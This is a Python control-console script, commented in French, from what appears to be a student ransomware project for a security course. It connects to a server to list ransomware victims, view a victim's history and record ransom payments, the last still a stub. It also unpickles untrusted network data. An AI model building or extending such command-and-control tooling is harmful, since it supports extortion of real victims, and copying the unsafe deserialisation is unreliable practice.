# --------------------------------------------
# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : main
# --------------------------------------------
import socket
from utile import security
import utile.configgetter as config
from utile import message
import pickle
import binascii


def main():
    """ Console de contrôle """
    # Key server start

    # Création de la socket de connexion
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # On se connecte
    s.connect((config.get_ip("../config.json"), config.get_port("../config.json")))
    # 19 ainsi il est initalisé à une variable impossible à atteindre
    choix = "19"
    # hasAsked 1 Before = Check si il a demander un listing avant
    # de vouloir check un historique.
    hasAsked = False
    key = receive_data(s)
    print(key)
    while choix != '4':
        # On demande un choix plus cohérent basé sur le menu plus haut
        print('CONSOLE DE CONTRÔLE'
              '\n==================='
              '\n1) Liste des victimes du ransomware'
              '\n2) Historique des états d''une victime'
              '\n3) Renseigner le paiement de rançon d' 'une victime'
              '\n4) Quitter')
        choix = input('Votre choix : ')
        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        if choix == '1':
            hasAsked = True
            # On demande au serveur frontale de lister les victimes
            # Lui va interroger la DB Sqlite
            d = message.list_victim_req()
            #s.send(d.encode('utf-8'))
            send_data(s, d)
            # On récupère la réponse en écoutant
            data = receive_data(s)
            #data_e = security.decrypt(data, key)
            print('LISTING DES VICTIMES DU RANSOMWARE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            print(data)
            print('\n')
        elif choix == '2':
            if hasAsked:
                # On demande au serveur frontale l'historique d'une victime
                # On construit un input pour demander à l'utilisateur l'ID
                id = input('Merci de préciser un ID pour consulter l''historique : ')
                # On transmet l'ID au serveur frontale
                d = message.history_req(id)
                #s.send(bytes(str(d), 'utf-8'))
                send_data(s, d)
                # On écoute la réponse
                #data_h = s.recv(2048).decode('utf-8')
                data_h = receive_data(s)
                # On reçoit l'historique...
                print(str(data_h) +"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            else:
                print("ERREUR : Veuillez d'abord lister les victimes!")
        elif choix == '3':
            # Todo Fill payload
            # C'est à faire
            print(fill_payload()+"\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        elif choix == '4':
            # On ferme la connexion et quitte la console de contrôle
            # On prévient le serveur qu'on ferme la connexion avant de la fermer
            # Afin de garder des traces (logs)
            #s.send(bytes(message.close_connexion(), 'utf-8'))
            send_data(s, message.close_connexion())
            data = receive_data(s)
            print(str(data)+"\n")
            # On break et la connexion se ferme en sortant du break
            break
    s.close()


def send_data(c, message, HEADERSIZE=10):
    """
    Créer un header pour la connexion TCP afin de savoir de où à où lire
    """
    serialized_payload = pickle.dumps(message)
    c.sendall(bytes(f"{len(serialized_payload):<{HEADERSIZE}}", 'utf-8'))
    c.sendall(serialized_payload)


def receive_data(c, HEADERSIZE=10):
    data_size = int(float(c.recv(HEADERSIZE)[0:HEADERSIZE]))
    received_payload = b""
    reamining_payload_size = data_size
    while reamining_payload_size != 0:
        received_payload += c.recv(reamining_payload_size)
        reamining_payload_size = data_size - len(received_payload)
    payload = pickle.loads(received_payload)
    return payload


def fill_payload():
    return 'Todo payload'


if __name__ == '__main__':
    main()